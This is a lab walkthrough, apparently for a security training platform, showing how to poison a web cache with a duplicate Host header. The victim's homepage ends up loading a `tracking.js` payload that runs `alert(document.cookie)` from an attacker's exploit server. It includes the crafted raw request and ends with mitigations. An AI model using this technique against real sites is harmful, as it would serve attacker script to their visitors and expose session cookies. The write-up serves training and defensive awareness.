# Lab: Web Cache Poisoning via Ambiguous Requests

## Description
This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An attacker can poison the cache so a malicious response (e.g., JavaScript execution) is served to other users.

## Objective
Poison the web cache so that the home page executes `alert(document.cookie)` in the victim’s browser.

## Exploitation Steps

1. **Open the lab** in Burp’s browser and click the **Home** link to refresh the homepage.

2. In **Burp Suite**, go to **Proxy > HTTP history**, find the `GET /` request and send it to **Repeater**.

3. In **Repeater**, observe the site’s behavior. You’ll notice the application validates the `Host` header. If you change it arbitrarily, the homepage becomes inaccessible.

4. Examine the response headers. You’ll see verbose caching headers showing cache hits and age. Use a cache buster like `GET /?cb=123` to bypass existing cache and force a new response.

5. Add a **second `Host` header** in Repeater with an arbitrary value. The server uses only the first for routing, but the second gets reflected in the absolute script URL (e.g., `/resources/js/tracking.js`), making it injectable.

6. Remove the second `Host` header and resend the request with the cache buster. Confirm that the cached response still contains your injected value.

7. Go to the **exploit server** and create a file at `/resources/js/tracking.js` containing:
   ```javascript
   alert(document.cookie)
   ```
8. in repeater modify the request as:
GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
send this until your exploit server's script is chached.
9. Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the `alert(document.cookie)` fires.

10. In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.
## Impact
Web cache poisoning allows an attacker to inject malicious content into a cached response, which is then served to all subsequent users. This can lead to client-side attacks like cross-site scripting (XSS), session hijacking, phishing, or persistent defacement of cached pages.

## Mitigation
- Do not reflect user-controllable input into cacheable responses.
- Enforce strict validation of all HTTP headers, especially `Host`, and reject duplicated or ambiguous headers.
- Configure cache servers to ignore unrecognized or duplicate headers.
- Normalize requests before caching and ensure consistent behavior between the cache and the backend.
- Avoid caching responses that include dynamic or user-specific data.
- 

## Author
Shivam Singh (vgod)
Penetration Tester & Bug Hunter  
GitHub: https://github.com/vgod-sec
